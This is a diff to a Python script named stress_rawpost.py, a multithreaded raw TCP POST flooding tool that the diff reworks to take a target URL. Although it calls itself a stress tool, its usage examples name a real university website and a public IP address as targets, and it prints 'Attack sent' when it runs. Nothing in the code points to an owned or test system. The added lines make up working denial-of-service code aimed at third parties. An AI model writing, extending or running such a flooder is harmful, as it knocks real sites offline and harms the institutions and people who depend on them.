@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-stress_rawpost.py - Raw TCP POST stress tool (Minimal headers)
-Usage: python3 stress_rawpost.py <target_ip> <port> <duration_seconds>
-Example: python3 stress_rawpost.py 202.91.160.10 80 90
+stress_rawpost.py - Raw TCP POST stress tool (URL-only)
+Usage: python3 stress_rawpost.py <target_url> <duration_seconds>
+Example: python3 stress_rawpost.py https://www.ucv.edu.ph 90
 """
 
 import socket
@@ -12,6 +12,7 @@ import threading
 import time
 import sys
 import random
+import urllib.parse
 import platform
 from concurrent.futures import ThreadPoolExecutor
 
@@ -36,10 +37,14 @@ POST_PAYLOADS = [
 ]
 
 class RawPOSTStress:
-    def __init__(self, host, port, duration, ssl_flag=False):
-        self.host = host
-        self.port = port
-        self.ssl_flag = ssl_flag
+    def __init__(self, url, duration):
+        parsed = urllib.parse.urlparse(url)
+        self.host = parsed.hostname
+        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        self.path = parsed.path or "/"
+        if parsed.query:
+            self.path += "?" + parsed.query
+        self.ssl_flag = parsed.scheme == "https"
         self.duration = duration
         self.running = True
         self.total_requests = 0
@@ -48,9 +53,19 @@ class RawPOSTStress:
         self.start_time = None
 
     def build_payload(self):
-        # Replace Host header with actual target
         payload = random.choice(POST_PAYLOADS)
-        return payload.replace(b"target", self.host.encode())
+        # Replace Host header and path
+        payload = payload.replace(b"target", self.host.encode())
+        # Replace / with actual path
+        payload = payload.replace(b"POST / ", f"POST {self.path} ".encode())
+        payload = payload.replace(b"POST /login", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /search", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /api", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /submit", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /upload", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /cmd", f"POST {self.path}".encode())
+        payload = payload.replace(b"POST /db", f"POST {self.path}".encode())
+        return payload
 
     def create_socket(self):
         try:
@@ -126,6 +141,7 @@ class RawPOSTStress:
                 pass
 
     def run(self):
+        print(f"[+] Target: {self.host}:{self.port}{self.path}")
         print("[+] Attack sent (raw POST).")
         self.start_time = time.time()
         with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
@@ -147,27 +163,20 @@ class RawPOSTStress:
             print(f"[+] Requests/sec: {reqs / elapsed:.2f}")
 
 def main():
-    if len(sys.argv) < 4:
-        print("Usage: python3 stress_rawpost.py <target_ip> <port> <duration_seconds>")
-        print("Example: python3 stress_rawpost.py 202.91.160.10 80 90")
-        print("Example: python3 stress_rawpost.py 202.91.160.10 443 90 --ssl")
+    if len(sys.argv) < 3:
+        print("Usage: python3 stress_rawpost.py <target_url> <duration_seconds>")
+        print("Example: python3 stress_rawpost.py https://www.ucv.edu.ph 90")
+        print("Example: python3 stress_rawpost.py http://192.168.1.1:8080 60")
         sys.exit(1)
 
-    host = sys.argv[1]
+    url = sys.argv[1]
     try:
-        port = int(sys.argv[2])
-    except ValueError:
-        print("[!] Port must be an integer")
-        sys.exit(1)
-    try:
-        duration = int(sys.argv[3])
+        duration = int(sys.argv[2])
     except ValueError:
         print("[!] Duration must be an integer (seconds)")
         sys.exit(1)
 
-    ssl_flag = "--ssl" in sys.argv
-
-    stress = RawPOSTStress(host, port, duration, ssl_flag)
+    stress = RawPOSTStress(url, duration)
     stress.run()
 
 if __name__ == "__main__":
